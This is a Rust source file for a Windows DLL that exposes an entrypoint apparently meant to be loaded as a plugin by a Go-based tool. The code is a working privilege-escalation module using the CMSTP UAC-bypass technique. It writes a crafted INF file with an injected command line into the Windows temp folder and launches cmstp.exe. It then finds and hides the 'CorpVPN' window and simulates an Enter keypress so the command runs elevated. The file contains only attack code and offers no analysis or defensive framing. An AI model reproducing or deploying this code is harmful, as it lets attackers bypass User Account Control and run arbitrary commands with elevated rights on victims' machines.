use enigo::{Direction::Click, Enigo, Key, Keyboard, Settings};
use rand::distributions::{Alphanumeric, DistString};
use std::ffi::CString;
use std::os::raw::{c_char, c_int, c_void};
use std::path::Path;
use std::process::Command;
use std::{fs, str};
use std::{thread, time};
use windows_sys::Win32::UI::WindowsAndMessaging::*;

type GoCallback = extern "C" fn(*const c_char, c_int) -> c_int;

#[no_mangle]
pub extern "C" fn entrypoint(args_buffer: *mut c_char, buffer_size: u32, cb: GoCallback) -> c_int {
    // Parse the arguments
    let args: &str = match std::str::from_utf8(unsafe {
        std::slice::from_raw_parts(args_buffer as *const u8, buffer_size as usize)
    }) {
        Ok(v) => v,
        Err(_) => return 1,
    };
    return execute(args, cb);
}

fn callback(msg: &str, cb: GoCallback) -> c_int {
    let msg = CString::new(msg.to_string()).unwrap();
    cb(msg.as_ptr(), msg.to_bytes().len() as c_int)
}

#[no_mangle]
pub extern "C" fn DllMain(
    _h_module: *mut c_void,
    _ul_reason_for_call: u32,
    _lp_reserved: *mut c_void,
) -> bool {
    true
}

fn execute(cmd_location: &str, cb: GoCallback) -> c_int {
    let cmstp_location = "c:\\windows\\system32\\cmstp.exe";
    if !Path::new(cmstp_location).exists() {
        return callback("file doesn't exist", cb);
    }

    let mut inf_data = String::new();
    inf_data.push_str("[version]\r\nSignature=$chicago$\r\nAdvancedINF=2.5\r\n\r\n[DefaultInstall]\r\nCustomDestination=CustInstDestSectionAllUsers\r\nRunPreSetupCommands=RunPreSetupCommandsSection\r\n\r\n[RunPreSetupCommandsSection]\r\n; Commands Here will be run Before Setup Begins to install\r\nREPLACE_COMMAND_LINE\r\ntaskkill /IM cmstp.exe /F\r\n\r\n[CustInstDestSectionAllUsers]\r\n49000,49001=AllUSer_LDIDSection, 7\r\n\r\n[AllUSer_LDIDSection]\r\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \"%UnexpectedError%\", \"\"\r\n\r\n[Strings]\r\nServiceName=\"CorpVPN\"\r\nShortSvcName=\"CorpVPN\"\r\n\r\n");

    inf_data = inf_data.replace("REPLACE_COMMAND_LINE", cmd_location);

    let inf_path: String = format!(
        "c:\\windows\\temp\\{}.inf",
        Alphanumeric.sample_string(&mut rand::thread_rng(), 16)
    );

    fs::write(&inf_path, inf_data).expect("error writing to the file");

    Command::new(cmstp_location)
        .args(["/au", inf_path.as_str()])
        .spawn();

    thread::sleep(time::Duration::from_secs(1));
    let mut final_message: String;
    if set_window_active() {
        final_message = String::from("All Done");
    } else {
        final_message = String::from("Something went wrong");
    }
    callback(&final_message.as_str(), cb)
}

fn set_window_active() -> bool {
    let mut enigo: Enigo = Enigo::new(&Settings::default()).unwrap();
    let mut window_handle: isize = 0;

    let mut loop_limit = 10; //limit the loop to 10 second
    loop {
        window_handle = unsafe {
            FindWindowA(
                std::ptr::null(),
                CString::new("CorpVPN").unwrap().as_ptr() as *const u8,
            )
        };
        if window_handle != 0 {
            break;
        }
        loop_limit = loop_limit - 1;
        if loop_limit == 0 {
            return false;
        }
        thread::sleep(time::Duration::from_secs(1));
    }
    if window_handle != 0 {
        unsafe {
            SetForegroundWindow(window_handle);
            ShowWindow(window_handle, 0);
        }
        enigo.key(Key::Return, Click);
    }
    return true;
}
